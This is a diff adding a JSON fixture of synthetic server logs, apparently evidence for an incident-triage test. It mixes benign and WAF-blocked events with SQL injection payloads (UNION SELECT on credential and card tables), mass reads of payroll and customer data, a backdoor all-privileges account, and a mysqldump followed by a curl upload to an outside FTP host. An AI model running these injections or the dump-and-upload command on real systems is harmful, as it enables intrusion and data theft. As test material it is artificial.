@@ -1,0 +1,55 @@
+{
+  "_comment": "Keyed by asset_id. Each entry has ts, source, event_type and raw. Entries appended at runtime by inject_new_evidence() carry \"injected\": true.",
+  "SRV-WEB-01": [
+    {"ts": "2026-09-11T02:13:51Z", "source": "apache/access", "event_type": "http_request", "raw": "203.0.113.45 - - [11/Sep/2026:02:13:51] \"GET /catalog?id=17 HTTP/1.1\" 200 4821"},
+    {"ts": "2026-09-11T02:14:07Z", "source": "modsecurity", "event_type": "waf_block", "raw": "[id \"942100\"] SQL Injection Attack Detected via libinjection - request BLOCKED, returned 403 to 203.0.113.45"},
+    {"ts": "2026-09-11T02:14:07Z", "source": "apache/access", "event_type": "http_request", "raw": "203.0.113.45 - - [11/Sep/2026:02:14:07] \"GET /catalog?id=17%20UNION%20SELECT%201,2,3-- HTTP/1.1\" 403 199"},
+    {"ts": "2026-09-11T02:14:09Z", "source": "mysql/general", "event_type": "db_query", "raw": "Query  SELECT name,price FROM catalog WHERE id=17"},
+    {"ts": "2026-09-11T02:14:22Z", "source": "apache/access", "event_type": "http_request", "raw": "203.0.113.45 - - [11/Sep/2026:02:14:22] \"GET /catalog?id=17%27%20OR%201=1-- HTTP/1.1\" 403 199"},
+    {"ts": "2026-09-11T02:15:40Z", "source": "mysql/error", "event_type": "db_status", "raw": "Note  Aborted connection 88213 to db: catalog user: web_ro - client closed connection"},
+    {"ts": "2026-09-11T02:18:02Z", "source": "auth", "event_type": "auth_success", "raw": "sshd: Accepted publickey for deploy from 10.20.0.9 port 51022"},
+    {"ts": "2026-09-11T03:00:01Z", "source": "cron", "event_type": "process_spawn", "raw": "CRON[41122]: (root) CMD (/usr/local/bin/rotate-logs.sh)"}
+  ],
+  "SRV-DB-02": [
+    {"ts": "2026-09-11T03:41:52Z", "source": "mysql/general", "event_type": "db_query", "raw": "Query  SELECT id,name FROM products WHERE sku=A1 UNION SELECT table_name,column_name FROM information_schema.columns--"},
+    {"ts": "2026-09-11T03:41:53Z", "source": "mysql/general", "event_type": "db_query", "raw": "Query  SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema NOT IN (sys,performance_schema)"},
+    {"ts": "2026-09-11T03:42:11Z", "source": "mysql/general", "event_type": "db_query", "raw": "Query  SELECT email,password_hash,full_name,card_last4 FROM customers LIMIT 50000"},
+    {"ts": "2026-09-11T03:42:11Z", "source": "mysql/slow", "event_type": "db_query", "raw": "Query_time: 38.221  Rows_sent: 48219  Rows_examined: 48219  SELECT email,password_hash,full_name,card_last4 FROM customers LIMIT 50000"},
+    {"ts": "2026-09-11T03:42:49Z", "source": "mysql/general", "event_type": "db_query", "raw": "Query  SELECT * FROM payment_tokens LIMIT 10000"},
+    {"ts": "2026-09-11T03:43:30Z", "source": "mysql/error", "event_type": "db_status", "raw": "Note  Connection from 198.51.100.23 closed after 41.9s, 2517483 bytes sent"}
+  ],
+  "SRV-APP-03": [
+    {"ts": "2026-09-11T01:07:29Z", "source": "tomcat/access", "event_type": "http_request", "raw": "203.0.113.77 - - [11/Sep/2026:01:07:29] \"POST /api/report HTTP/1.1\" 200 1204"},
+    {"ts": "2026-09-11T01:07:33Z", "source": "tomcat/access", "event_type": "http_request", "raw": "203.0.113.77 - - [11/Sep/2026:01:07:33] \"POST /api/report HTTP/1.1\" 500 2932"},
+    {"ts": "2026-09-11T01:07:33Z", "source": "mysql/error", "event_type": "db_error", "raw": "ERROR 1064 (42000): You have an error in your SQL syntax near SELECT payload FROM reports WHERE id= at line 1"},
+    {"ts": "2026-09-11T01:07:41Z", "source": "tomcat/app", "event_type": "app_error", "raw": "com.corp.report.ReportDao - SQLSyntaxErrorException handled, request rejected, 0 rows returned to caller"},
+    {"ts": "2026-09-11T01:08:02Z", "source": "tomcat/access", "event_type": "http_request", "raw": "203.0.113.77 - - [11/Sep/2026:01:08:02] \"POST /api/report HTTP/1.1\" 500 2932"},
+    {"ts": "2026-09-11T01:12:15Z", "source": "auth", "event_type": "auth_success", "raw": "sshd: Accepted password for svc_app from 10.20.3.33 port 44120"}
+  ],
+  "SRV-DB-09": [
+    {"ts": "2026-09-11T03:14:52Z", "source": "auth", "event_type": "auth_success", "raw": "sshd: Accepted password for svc_app from 10.20.3.33 port 55830"},
+    {"ts": "2026-09-11T03:15:20Z", "source": "mysql/general", "event_type": "db_query", "raw": "Query  SELECT employee_id,ssn,salary,bank_account FROM payroll"},
+    {"ts": "2026-09-11T03:15:58Z", "source": "mysql/slow", "event_type": "db_query", "raw": "Query_time: 31.004  Rows_sent: 12744  Rows_examined: 12744  SELECT employee_id,ssn,salary,bank_account FROM payroll"},
+    {"ts": "2026-09-11T03:16:44Z", "source": "mysql/general", "event_type": "db_query", "raw": "Query  CREATE USER svc_backup2 IDENTIFIED BY ***; GRANT ALL PRIVILEGES ON *.* TO svc_backup2"},
+    {"ts": "2026-09-11T03:17:10Z", "source": "process", "event_type": "process_spawn", "raw": "bash[70233]: svc_app executed: mysqldump --all-databases | gzip > /tmp/.cache/d.gz"},
+    {"ts": "2026-09-11T03:19:02Z", "source": "process", "event_type": "process_spawn", "raw": "bash[70298]: svc_app executed: curl -T /tmp/.cache/d.gz ftp://203.0.113.77/"}
+  ],
+  "SRV-FIN-07": [
+    {"ts": "2026-09-11T04:22:10Z", "source": "mysql/general", "event_type": "db_query", "raw": "Query  SELECT id,label FROM ledgers WHERE id=4 UNION SELECT username,password_hash FROM admin_users--"},
+    {"ts": "2026-09-11T04:22:31Z", "source": "mysql/general", "event_type": "db_query", "raw": "Query  SELECT account_no,routing_no,balance FROM accounts LIMIT 25000"},
+    {"ts": "2026-09-11T04:22:31Z", "source": "mysql/slow", "event_type": "db_query", "raw": "Query_time: 29.880  Rows_sent: 24117  Rows_examined: 24117  SELECT account_no,routing_no,balance FROM accounts LIMIT 25000"},
+    {"ts": "2026-09-11T04:23:14Z", "source": "mysql/error", "event_type": "db_status", "raw": "Note  Connection from 198.51.100.88 closed after 33.2s, 1988342 bytes sent"}
+  ],
+  "SRV-WEB-04": [
+    {"ts": "2026-09-11T05:02:38Z", "source": "mysql/error", "event_type": "db_status", "raw": "Warning  Host 192.0.2.66 connection refused (max_connect_errors), 12 attempts"},
+    {"ts": "2026-09-11T05:02:45Z", "source": "mysql/error", "event_type": "db_status", "raw": "Warning  Access denied for user root@192.0.2.66 (using password: YES)"},
+    {"ts": "2026-09-11T05:02:47Z", "source": "mysql/error", "event_type": "db_status", "raw": "Warning  Access denied for user admin@192.0.2.66 (using password: YES)"},
+    {"ts": "2026-09-11T05:02:51Z", "source": "mysql/error", "event_type": "db_status", "raw": "Warning  Access denied for user web_ro@192.0.2.66 (using password: YES)"},
+    {"ts": "2026-09-11T05:03:02Z", "source": "apache/access", "event_type": "http_request", "raw": "192.0.2.66 - - [11/Sep/2026:05:03:02] \"GET /portal/login HTTP/1.1\" 200 3312"}
+  ],
+  "SRV-DB-05": [
+    {"ts": "2026-09-11T06:18:29Z", "source": "mysql/general", "event_type": "db_query", "raw": "Query  SELECT plan,amount FROM billing WHERE id=9 UNION SELECT card_number,cvv FROM stored_cards--"},
+    {"ts": "2026-09-11T06:18:52Z", "source": "mysql/slow", "event_type": "db_query", "raw": "Query_time: 47.120  Rows_sent: 61880  Rows_examined: 61880  SELECT card_number,cvv,exp FROM stored_cards"},
+    {"ts": "2026-09-11T06:19:40Z", "source": "mysql/error", "event_type": "db_status", "raw": "Note  Connection from 203.0.113.150 closed after 52.1s, 3284119 bytes sent"}
+  ]
+}
